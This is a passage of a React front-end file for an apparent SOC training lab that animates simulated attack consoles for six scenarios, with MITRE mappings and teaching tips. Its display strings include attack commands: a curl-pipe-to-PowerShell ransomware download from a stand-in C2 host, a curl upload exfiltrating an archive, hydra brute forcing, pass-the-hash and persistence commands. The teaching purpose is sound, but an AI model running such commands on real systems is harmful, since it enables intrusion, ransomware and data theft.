"use client";

import { AnimatePresence, motion } from "framer-motion";
import { useMutation } from "@tanstack/react-query";
import {
  Activity,
  AlertTriangle,
  BookText,
  CheckCircle2,
  Database,
  FlaskConical,
  Info,
  Network,
  Shield,
  Terminal,
  Users,
  X,
  Zap,
} from "lucide-react";
import Link from "next/link";
import { useEffect, useRef, useState } from "react";
import { toast } from "sonner";

import { Badge } from "@/components/ui/badge";
import { Button, buttonVariants } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tooltip, TooltipContent, TooltipTrigger } from "@/components/ui/tooltip";
import { apiFetch } from "@/lib/api/client";
import { cn } from "@/lib/utils";

type LineType = "command" | "info" | "success" | "warning" | "error" | "phase" | "dim";

interface ConsoleLine {
  text: string;
  type: LineType;
  delay: number;
}

interface ScenarioMeta {
  id: string;
  name: string;
  description: string;
  severity: string;
  mitre_tactics: string[];
  mitre_techniques: string[];
  threat_actor: string;
  estimated_alerts: number;
  duration_minutes: number;
}

interface RunResult {
  scenario_id: string;
  name: string;
  events_ingested: number;
  message: string;
}

interface ScenarioDoc {
  objective: string;
  attack_flow: string[];
  lab_commands: string[];
  detection_focus: string[];
  teaching_tips: string[];
}

const LINE_COLORS: Record<LineType, string> = {
  command: "text-cyan-300",
  info: "text-gray-400",
  success: "text-green-400",
  warning: "text-yellow-400",
  error: "text-red-400/80",
  phase: "text-white font-semibold tracking-wide",
  dim: "text-gray-700",
};

const SCENARIO_PHASES: Record<string, string[]> = {
  ssh_brute_force: ["Enumeration", "Brute Force", "Access"],
  port_scan_exploit: ["Recon", "Fingerprint", "Exploit"],
  credential_stuffing: ["Setup", "Spray: admin", "Spray: jsmith"],
  ransomware_chain: ["Recon", "Lateral Move", "Payload", "Impact"],
  data_exfiltration: ["File Access", "Staging", "Exfil Attempt"],
  apt_lateral_movement: ["Initial Access", "Persistence", "Discovery", "Lateral Move"],
};

const CONSOLE_SCRIPTS: Record<string, ConsoleLine[]> = {
  ssh_brute_force: [
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 0 },
    { text: "  PHASE 1  ·  TARGET ENUMERATION", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "nmap -sV -p 22 10.0.50.10", type: "command", delay: 600 },
    { text: "[*] Nmap 7.94 scan initiated on 10.0.50.10", type: "info", delay: 700 },
    { text: "[+] 22/tcp  OPEN  ssh  OpenSSH 8.9p1 Ubuntu 22.04", type: "success", delay: 500 },
    { text: "[*] Target accepts password auth: YES", type: "info", delay: 400 },
    { text: "[*] Credential wordlist loaded — 14 pairs queued", type: "info", delay: 400 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 200 },
    { text: "  PHASE 2  ·  CREDENTIAL BRUTE FORCE", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "hydra -l admin -P wordlist.txt ssh://10.0.50.10 -t 4", type: "command", delay: 500 },
    { text: "[-] admin : password123     → FAILED", type: "error", delay: 280 },
    { text: "[-] admin : admin@2024      → FAILED", type: "error", delay: 230 },
    { text: "[-] admin : Summer2024!     → FAILED", type: "error", delay: 230 },
    { text: "[-] admin : Welcome1        → FAILED", type: "error", delay: 220 },
    { text: "[-] admin : P@ssw0rd        → FAILED", type: "error", delay: 220 },
    { text: "[-] admin : Qwerty123       → FAILED", type: "error", delay: 220 },
    { text: "[-] admin : Letmein!        → FAILED", type: "error", delay: 220 },
    { text: "[-] admin : CyberSec1       → FAILED", type: "error", delay: 220 },
    { text: "[!] ⚡ IDS ALERT: brute_force rule — 8 failures from 203.0.113.150", type: "warning", delay: 500 },
    { text: "[-] admin : root123         → FAILED", type: "error", delay: 300 },
    { text: "[-] admin : toor            → FAILED", type: "error", delay: 230 },
    { text: "[-] admin : Dragon2024      → FAILED", type: "error", delay: 230 },
    { text: "[-] admin : Master99        → FAILED", type: "error", delay: 230 },
    { text: "[+] admin : S3cur1ty!       → ◀ SUCCESS ▶", type: "success", delay: 700 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 250 },
    { text: "  PHASE 3  ·  INITIAL ACCESS", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "ssh admin@10.0.50.10", type: "command", delay: 500 },
    { text: "[+] SSH session established as admin@10.0.50.10", type: "success", delay: 650 },
    { text: "[*] admin@10.0.50.10:~$ whoami  →  admin (uid=0)", type: "info", delay: 400 },
    { text: "[*] Uploading persistence payload → /tmp/.svc", type: "info", delay: 500 },
    { text: "[+] Foothold established. 15 events injected into SIEM.", type: "success", delay: 600 },
  ],

  port_scan_exploit: [
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 0 },
    { text: "  PHASE 1  ·  NETWORK RECONNAISSANCE", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "nmap -sS -p 1-20 10.0.50.10 --scan-delay 5s", type: "command", delay: 600 },
    { text: "[*] SYN stealth scan initiated (20 ports)...", type: "info", delay: 700 },
    { text: "[*] Probing port  1  (TCPMUX)   ...", type: "dim", delay: 160 },
    { text: "[*] Probing port  5  (RJE)      ...", type: "dim", delay: 160 },
    { text: "[*] Probing port  7  (ECHO)     ...", type: "dim", delay: 160 },
    { text: "[*] Probing port 11  (SYSTAT)   ...", type: "dim", delay: 160 },
    { text: "[*] Probing port 15  (NETSTAT)  ...", type: "dim", delay: 160 },
    { text: "[*] Probing port 20  (FTP-DATA) ...", type: "dim", delay: 160 },
    { text: "[!] ⚡ IDS ALERT: port_scan rule — 15 distinct ports from 203.0.113.152", type: "warning", delay: 450 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 200 },
    { text: "  PHASE 2  ·  SERVICE FINGERPRINTING", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "nmap -sV -sC -p 80,443,8080,8443,3000 10.0.50.10", type: "command", delay: 500 },
    { text: "[+] 80/tcp    OPEN  http   nginx 1.24 (Ubuntu)", type: "success", delay: 400 },
    { text: "[+] 443/tcp   OPEN  https  nginx 1.24 (TLS 1.3)", type: "success", delay: 350 },
    { text: "[+] 8080/tcp  OPEN  http   Apache Tomcat 10.1.28", type: "success", delay: 350 },
    { text: "[*] CVE-2023-44487: HTTP/2 Rapid Reset  CVSS 9.8 HIGH", type: "warning", delay: 500 },
    { text: "[*] CVE-2024-21626: runc escape          CVSS 8.6 HIGH", type: "warning", delay: 380 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 200 },
    { text: "  PHASE 3  ·  EXPLOITATION ATTEMPTS", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "python3 exploit_CVE-2023-44487.py -t 10.0.50.10", type: "command", delay: 500 },
    { text: "[-] Port  80  — BLOCKED by WAF (rule: http_exploit)", type: "error", delay: 400 },
    { text: "[-] Port 443  — BLOCKED by WAF (rule: https_exploit)", type: "error", delay: 350 },
    { text: "[-] Port 8080 — BLOCKED by IDS (signature match)", type: "error", delay: 350 },
    { text: "[-] Port 8443 — BLOCKED by IDS (signature match)", type: "error", delay: 350 },
    { text: "[!] ⚡ IDS ALERT: exploitation_attempt — 5 signatures matched", type: "warning", delay: 500 },
    { text: "[*] 25 events injected into SIEM.", type: "info", delay: 500 },
  ],

  credential_stuffing: [
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 0 },
    { text: "  PHASE 1  ·  PROXY ROTATION SETUP", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "credmaster --module oauth2 --target 10.0.50.10/auth", type: "command", delay: 600 },
    { text: "[*] Proxy pool loaded: 8 rotating IPs (evasion mode)", type: "info", delay: 500 },
    { text: "[*] Credential pairs: 16 (sourced from breach database)", type: "info", delay: 400 },
    { text: "[*] Rate limit: 1 req / 18s per IP — IDS evasion active", type: "info", delay: 400 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 200 },
    { text: "  PHASE 2  ·  SPRAYING TARGET: admin", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "[203.0.113.151] admin : breach_pass_01  → FAILED", type: "error", delay: 280 },
    { text: "[203.0.113.155] admin : breach_pass_02  → FAILED", type: "error", delay: 260 },
    { text: "[203.0.113.156] admin : breach_pass_03  → FAILED", type: "error", delay: 260 },
    { text: "[203.0.113.157] admin : breach_pass_04  → FAILED", type: "error", delay: 260 },
    { text: "[203.0.113.160] admin : breach_pass_05  → FAILED", type: "error", delay: 260 },
    { text: "[203.0.113.161] admin : breach_pass_06  → FAILED", type: "error", delay: 260 },
    { text: "[203.0.113.162] admin : breach_pass_07  → FAILED", type: "error", delay: 260 },
    { text: "[203.0.113.163] admin : breach_pass_08  → FAILED", type: "error", delay: 260 },
    { text: "[!] ⚡ IDS ALERT: failed_login_burst — user admin (8 failures)", type: "warning", delay: 480 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 200 },
    { text: "  PHASE 3  ·  SPRAYING TARGET: jsmith", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "[203.0.113.157] jsmith : breach_pass_09 → FAILED", type: "error", delay: 280 },
    { text: "[203.0.113.160] jsmith : breach_pass_10 → FAILED", type: "error", delay: 260 },
    { text: "[203.0.113.155] jsmith : breach_pass_11 → FAILED", type: "error", delay: 260 },
    { text: "[203.0.113.163] jsmith : breach_pass_12 → FAILED", type: "error", delay: 260 },
    { text: "[203.0.113.151] jsmith : breach_pass_13 → FAILED", type: "error", delay: 260 },
    { text: "[203.0.113.156] jsmith : breach_pass_14 → FAILED", type: "error", delay: 260 },
    { text: "[203.0.113.162] jsmith : breach_pass_15 → FAILED", type: "error", delay: 260 },
    { text: "[203.0.113.161] jsmith : breach_pass_16 → FAILED", type: "error", delay: 260 },
    { text: "[!] ⚡ IDS ALERT: failed_login_burst — user jsmith (8 failures)", type: "warning", delay: 480 },
    { text: "[*] 16 events injected. 2 alerts triggered.", type: "info", delay: 500 },
  ],

  ransomware_chain: [
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 0 },
    { text: "  PHASE 1  ·  RECONNAISSANCE", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "nmap -sS -p 3100-3116 10.0.50.10 --open", type: "command", delay: 600 },
    { text: "[*] SYN scan: probing 16 service ports...", type: "info", delay: 600 },
    { text: "[*] Probing SMB shares, RDP, WinRM surfaces...", type: "dim", delay: 200 },
    { text: "[+] 3100-3116/tcp  OPEN (custom services detected)", type: "success", delay: 400 },
    { text: "[!] ⚡ IDS ALERT: port_scan rule triggered", type: "warning", delay: 400 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 200 },
    { text: "  PHASE 2  ·  LATERAL MOVEMENT", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "impacket-smbclient //10.0.50.10/C$ -no-pass", type: "command", delay: 500 },
    { text: "[+] SMB/445    CONNECTED — DOMAIN\\SYSTEM session", type: "success", delay: 450 },
    { text: "[+] RDP/3389   CONNECTED — Remote desktop active", type: "success", delay: 400 },
    { text: "[+] WinRM/5985 CONNECTED — PowerShell remoting on", type: "success", delay: 400 },
    { text: "[*] Shares enumerated: ADMIN$, C$, IPC$, BACKUPS", type: "info", delay: 400 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 200 },
    { text: "  PHASE 3  ·  PAYLOAD DELIVERY", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "curl -s http://c2.srv/locker.exe | powershell -", type: "command", delay: 500 },
    { text: "[*] Downloading ransomware payload (2.4 MB)...", type: "info", delay: 400 },
    { text: "[!] EDR ALERT: Ransomware signature — QUARANTINE ATTEMPT", type: "warning", delay: 500 },
    { text: "[-] First attempt blocked by EDR", type: "error", delay: 300 },
    { text: "[*] Retrying with obfuscated PE loader...", type: "info", delay: 400 },
    { text: "[!] EDR ALERT: Obfuscated payload — second QUARANTINE", type: "warning", delay: 450 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 200 },
    { text: "  PHASE 4  ·  IMPACT", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "[!] CRITICAL: Mass file rename — .encrypted extension", type: "warning", delay: 500 },
    { text: "[!] CRITICAL: VSS shadow copies being deleted", type: "warning", delay: 400 },
    { text: "[!] CRITICAL: Ransom note dropped — README_DECRYPT.txt", type: "warning", delay: 400 },
    { text: "[*] 25 events injected. Multiple CRITICAL alerts triggered.", type: "info", delay: 600 },
  ],

  data_exfiltration: [
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 0 },
    { text: "  PHASE 1  ·  SENSITIVE FILE ACCESS", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "net use Z: \\\\10.0.50.10\\SENSITIVE /user:contractor1", type: "command", delay: 600 },
    { text: "[+] Share mounted: Z: → \\\\10.0.50.10\\SENSITIVE", type: "success", delay: 500 },
    { text: "[DLP] WARN: HR_salary_Q4.xlsx        — classified", type: "warning", delay: 400 },
    { text: "[DLP] WARN: customer_database.csv    — classified", type: "warning", delay: 340 },
    { text: "[DLP] WARN: source_code_auth.zip     — classified", type: "warning", delay: 340 },
    { text: "[DLP] WARN: executive_strategy.pdf   — classified", type: "warning", delay: 340 },
    { text: "[DLP] WARN: vpn_credentials.txt      — classified", type: "warning", delay: 340 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 200 },
    { text: "  PHASE 2  ·  STAGING & TRANSFER", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "7z a -p'$3cr3t!' archive.7z Z:\\*", type: "command", delay: 500 },
    { text: "[*] Compressing 5 files → archive.7z (187 MB)", type: "info", delay: 500 },
    { text: "curl -T archive.7z https://198.51.100.99/drop/upload", type: "command", delay: 500 },
    { text: "[+] Transfer #1: 187 MB → 198.51.100.99 (HTTPS/443)", type: "success", delay: 450 },
    { text: "[+] Transfer #2:  94 MB → 198.51.100.99 (HTTPS/443)", type: "success", delay: 400 },
    { text: "[+] Transfer #3:  52 MB → 198.51.100.99 (HTTPS/443)", type: "success", delay: 400 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 200 },
    { text: "  PHASE 3  ·  BLOCKED EXFIL ATTEMPT", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "ftp 198.51.100.88", type: "command", delay: 500 },
    { text: "[-] FTP BLOCKED — egress policy: no_ftp_egress", type: "error", delay: 400 },
    { text: "[-] Firewall DROP 203.0.113.154 → 198.51.100.88:21", type: "error", delay: 350 },
    { text: "[*] 10 events injected. DLP alerts triggered.", type: "info", delay: 500 },
  ],

  apt_lateral_movement: [
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 0 },
    { text: "  PHASE 1  ·  INITIAL ACCESS", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "apt_toolkit.py --module initial_access --user svc_backup", type: "command", delay: 600 },
    { text: "[*] Using stolen credentials: svc_backup / [REDACTED]", type: "info", delay: 500 },
    { text: "[+] Auth SUCCESS: svc_backup from 203.0.113.155 (new geo)", type: "success", delay: 550 },
    { text: "[!] ⚡ ALERT: Privileged login from unknown location", type: "warning", delay: 400 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 200 },
    { text: "  PHASE 2  ·  PERSISTENCE", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "schtasks /create /tn WindowsUpdateHelper /sc onlogon", type: "command", delay: 500 },
    { text: "[+] Scheduled task created: WindowsUpdateHelper", type: "success", delay: 400 },
    { text: "reg add HKLM\\...\\Run /v SvcHostHelper /d payload.exe", type: "command", delay: 500 },
    { text: "[+] Registry run key: HKLM\\...\\Run → SvcHostHelper", type: "success", delay: 400 },
    { text: "sc create SvcHostHelper binpath= payload.exe start= auto", type: "command", delay: 500 },
    { text: "[+] Service installed: SvcHostHelper (auto-start)", type: "success", delay: 400 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 200 },
    { text: "  PHASE 3  ·  INTERNAL DISCOVERY", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "arp-scan -l && nbtscan 10.0.0.0/24", type: "command", delay: 500 },
    { text: "[*] ARP + NetBIOS sweep — 5 internal targets found", type: "info", delay: 500 },
    { text: "[+] 10.0.1.20  WIN-DC01   (Domain Controller)", type: "success", delay: 300 },
    { text: "[+] 10.0.2.15  WIN-FILE01 (File Server)", type: "success", delay: 250 },
    { text: "[+] 10.0.3.8   WIN-SQL01  (Database Server)", type: "success", delay: 250 },
    { text: "[+] 10.0.4.30  WIN-WEB01  (Web Server)", type: "success", delay: 250 },
    { text: "[!] ⚡ IDS ALERT: denied_access_spike — 22 events blocked", type: "warning", delay: 420 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 200 },
    { text: "  PHASE 4  ·  LATERAL MOVEMENT (Pass-the-Hash)", type: "phase", delay: 150 },
    { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", type: "dim", delay: 80 },
    { text: "impacket-smbexec svc_backup@10.0.1.20 -hashes :NTLM_HASH", type: "command", delay: 500 },
    { text: "[+] PTH → WIN-DC01   ◀ DOMAIN CONTROLLER COMPROMISED", type: "success", delay: 650 },
    { text: "[+] PTH → WIN-FILE01 (File Server)", type: "success", delay: 400 },
    { text: "[+] PTH → WIN-SQL01  (Database Server)", type: "success", delay: 400 },
    { text: "[+] PTH → WIN-WEB01  (Web Server)", type: "success", delay: 400 },
    { text: "[!] ⚡ CRITICAL: Pass-the-hash lateral movement detected", type: "warning", delay: 550 },
    { text: "[*] 35 events injected. Multiple CRITICAL alerts triggered.", type: "info", delay: 600 },
  ],
};

const SCENARIO_ICONS: Record<string, React.ElementType> = {
  ssh_brute_force: Shield,
  port_scan_exploit: Network,
  credential_stuffing: Users,
  ransomware_chain: Zap,
  data_exfiltration: Database,
  apt_lateral_movement: Activity,
};

const ICON_COLORS: Record<string, string> = {
  ssh_brute_force: "text-amber-400",
  port_scan_exploit: "text-cyan-400",
  credential_stuffing: "text-violet-400",
  ransomware_chain: "text-red-400",
  data_exfiltration: "text-orange-400",
  apt_lateral_movement: "text-rose-400",
};

const SEVERITY_CLASSES: Record<string, string> = {
  low: "bg-emerald-500/15 text-emerald-400 border-emerald-500/20",
  medium: "bg-amber-500/15 text-amber-400 border-amber-500/20",
  high: "bg-orange-500/15 text-orange-400 border-orange-500/20",
  critical: "bg-red-600/20 text-red-400 border-red-500/20",
};

const MITRE_EXPLANATIONS: Record<string, string> = {
  "T1110.003": "Password Spraying: few common passwords against many users.",
  "T1110.004": "Credential Stuffing: stolen credential pairs reused at scale.",
  T1046: "Network Service Scanning: probing ports/services for reachable targets.",
  T1190: "Exploit Public-Facing Application: attempts against internet-facing apps.",
  "T1021.001": "Remote Services SMB/Windows Admin Shares used for lateral movement.",
  T1486: "Data Encrypted for Impact: ransomware-style encryption behavior.",
  T1560: "Archive Collected Data before exfiltration.",
  T1048: "Exfiltration Over Alternative Protocol (e.g. HTTPS/FTP channels).",
  T1078: "Valid Accounts: abuse of legitimate credentials.",
  T1053: "Scheduled Task/Job persistence execution.",
  T1018: "Remote System Discovery inside internal network.",
  T1021: "Remote Services lateral movement (RDP/SMB/WinRM).",
};

const SCENARIO_DOCS: Record<string, ScenarioDoc> = {
  ssh_brute_force: {
    objective: "Show credential guessing against SSH and resulting SOC detections.",
    attack_flow: ["Enumerate SSH service", "Run repeated password guesses", "Gain access event"],
    lab_commands: [
      "nmap -sV -p 22 10.0.50.10",
      "hydra -l admin -P wordlist.txt ssh://10.0.50.10 -t 4",
      "ssh admin@10.0.50.10",
    ],
    detection_focus: ["Brute force burst", "Repeated auth failures", "First successful login after failures"],
    teaching_tips: [
      "Ask students to correlate failed logins with source IP and username.",
      "Discuss lockout policies and MFA controls.",
    ],
  },
  port_scan_exploit: {
    objective: "Teach reconnaissance-to-exploitation transition in one timeline.",
    attack_flow: ["Scan multiple ports", "Fingerprint web services", "Attempt exploit payloads"],
    lab_commands: [
      "nmap -sS -p 1-20 10.0.50.10",
      "nmap -sV -sC -p 80,443,8080,8443,3000 10.0.50.10",
      "python3 exploit_CVE-2023-44487.py -t 10.0.50.10",
    ],
    detection_focus: ["Distinct-port surge", "High-value service probing", "Blocked exploit signatures"],
    teaching_tips: [
      "Have students separate recon noise from confirmed exploit attempts.",
      "Review why WAF/IDS blocked traffic still matters for escalation.",
    ],
  },
  credential_stuffing: {
    objective: "Demonstrate distributed password abuse with rotating source IPs.",
    attack_flow: ["Load stolen credentials", "Spray user admin", "Spray user jsmith"],
    lab_commands: [
      "credmaster --module oauth2 --target 10.0.50.10/auth",
      "Proxy rotation with staged login attempts",
    ],
    detection_focus: ["Cross-IP auth failures", "Per-user burst patterns", "Low-and-slow evasion behavior"],
    teaching_tips: [
      "Teach students to pivot on username, not only source IP.",
      "Compare password spraying vs credential stuffing patterns.",
    ],
  },
  ransomware_chain: {
    objective: "Walk through full kill-chain from recon to encryption impact.",
    attack_flow: ["Recon scan", "Lateral movement", "Payload delivery", "Impact indicators"],
    lab_commands: [
      "nmap -sS -p 3100-3116 10.0.50.10 --open",
      "impacket-smbclient //10.0.50.10/C$ -no-pass",
      "curl -s http://c2.srv/locker.exe | powershell -",
    ],
    detection_focus: ["Lateral movement ports", "EDR ransomware signatures", "Mass encryption artifacts"],
    teaching_tips: [
      "Ask when incident should be escalated to critical severity.",
      "Discuss containment order: isolate host, block C2, preserve evidence.",
    ],
  },
  data_exfiltration: {
    objective: "Train DLP and egress monitoring analysis for insider risk.",
    attack_flow: ["Sensitive file access", "Archive/stage data", "Outbound transfer attempts"],
    lab_commands: [
      "net use Z: \\\\10.0.50.10\\SENSITIVE /user:contractor1",
      "7z a -p'$3cr3t!' archive.7z Z:\\*",
      "curl -T archive.7z https://198.51.100.99/drop/upload",
    ],
    detection_focus: ["DLP file access alerts", "Large outbound transfer spikes", "Blocked FTP egress attempts"],
    teaching_tips: [
      "Teach students to compare business context vs anomalous transfer volume.",
      "Show why HTTPS exfil can be missed without DLP+UEBA correlation.",
    ],
  },
  apt_lateral_movement: {
    objective: "Model stealthy multi-stage intrusion with persistence and lateral movement.",
    attack_flow: ["Valid account login", "Persistence setup", "Internal discovery", "Pass-the-hash movement"],
    lab_commands: [
      "schtasks /create /tn WindowsUpdateHelper /sc onlogon",
      "arp-scan -l && nbtscan 10.0.0.0/24",
      "impacket-smbexec svc_backup@10.0.1.20 -hashes :NTLM_HASH",
    ],
    detection_focus: ["Unusual privileged login", "Persistence artifacts", "SMB lateral movement chain"],
    teaching_tips: [
      "Ask students to identify earliest true compromise signal.",
      "Explain confidence scoring when evidence spans multiple hosts.",
    ],
  },
};

const STATIC_SCENARIOS: ScenarioMeta[] = [
  {
    id: "ssh_brute_force",
    name: "SSH Brute Force Campaign",
    description: "Attacker hammers SSH with password guessing until gaining access. Triggers the brute force detection rule and generates a high-severity incident.",
    severity: "high",
    mitre_tactics: ["Credential Access"],
    mitre_techniques: ["T1110.003"],
    threat_actor: "Generic opportunistic attacker",
    estimated_alerts: 1,
    duration_minutes: 5,
  },
  {
    id: "port_scan_exploit",
    name: "Reconnaissance & Service Exploitation",
    description: "Attacker performs a full port scan to map the network, then launches exploitation attempts against discovered web services.",
    severity: "high",
    mitre_tactics: ["Discovery", "Initial Access"],
    mitre_techniques: ["T1046", "T1190"],
    threat_actor: "Opportunistic threat actor",
    estimated_alerts: 1,
    duration_minutes: 3,
  },
  {
    id: "credential_stuffing",
    name: "Credential Stuffing Attack",
    description: "Attacker rotates through proxy IPs to spray stolen credential pairs against the authentication service, targeting multiple accounts.",
    severity: "medium",
    mitre_tactics: ["Credential Access"],
    mitre_techniques: ["T1110.004"],
    threat_actor: "Cybercrime group with credential database",
    estimated_alerts: 2,
    duration_minutes: 5,
  },
  {
    id: "ransomware_chain",
    name: "Ransomware Kill Chain",
    description: "Full ransomware campaign: reconnaissance scan → lateral movement via SMB/RDP → payload delivery and file encryption.",
    severity: "critical",
    mitre_tactics: ["Discovery", "Lateral Movement", "Impact"],
    mitre_techniques: ["T1046", "T1021.001", "T1486"],
    threat_actor: "Ransomware-as-a-Service operator",
    estimated_alerts: 2,
    duration_minutes: 10,
  },
  {
    id: "data_exfiltration",
    name: "Insider Data Exfiltration",
    description: "Malicious insider accesses sensitive files via DLP-monitored shares then attempts to exfiltrate data to external hosts over HTTPS and FTP.",
    severity: "high",
    mitre_tactics: ["Collection", "Exfiltration"],
    mitre_techniques: ["T1560", "T1048"],
    threat_actor: "Malicious insider / compromised contractor",
    estimated_alerts: 1,
    duration_minutes: 6,
  },
  {
    id: "apt_lateral_movement",
    name: "APT Lateral Movement Campaign",
    description: "Nation-state style attack: initial access via stolen service account → persistence → internal discovery → lateral movement with pass-the-hash.",
    severity: "critical",
    mitre_tactics: ["Initial Access", "Persistence", "Discovery", "Lateral Movement"],
    mitre_techniques: ["T1078", "T1053", "T1018", "T1021"],
    threat_actor: "Advanced Persistent Threat (APT)",
    estimated_alerts: 2,
    duration_minutes: 15,
  },
];

function AttackConsoleModal({
  scenario,
  result,
  onClose,
}: {
  scenario: ScenarioMeta;
  result: RunResult | null;
  onClose: () => void;
}) {
  const [lines, setLines] = useState<{ line: ConsoleLine; ts: string }[]>([]);
  const [done, setDone] = useState(false);
  const termRef = useRef<HTMLDivElement>(null);
  const script = CONSOLE_SCRIPTS[scenario.id] ?? [];
  const phases = SCENARIO_PHASES[scenario.id] ?? [];

  useEffect(() => {
    const ids: ReturnType<typeof setTimeout>[] = [];
    let cum = 0;
    script.forEach((line, i) => {
      cum += line.delay;
      const id = setTimeout(() => {
        const ts = new Date().toLocaleTimeString("en-GB", { hour12: false });
        setLines((prev) => [...prev, { line, ts }]);
        if (i === script.length - 1) setDone(true);
      }, cum);
      ids.push(id);
    });
    return () => ids.forEach(clearTimeout);
  }, []);

  useEffect(() => {
    if (termRef.current) {
      termRef.current.scrollTop = termRef.current.scrollHeight;
    }
  }, [lines]);

  const progress = script.length > 0 ? lines.length / script.length : 0;
  const phaseIndex = Math.min(
    Math.floor(progress * phases.length),
    phases.length - 1,
  );

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: 20 }}
      transition={{ duration: 0.2 }}
      className="fixed inset-0 z-50 flex flex-col bg-[#080a0c]/97 backdrop-blur-md"
    >
      {/* Header */}
      <div className="flex shrink-0 items-center justify-between border-b border-white/8 bg-white/3 px-5 py-2.5">
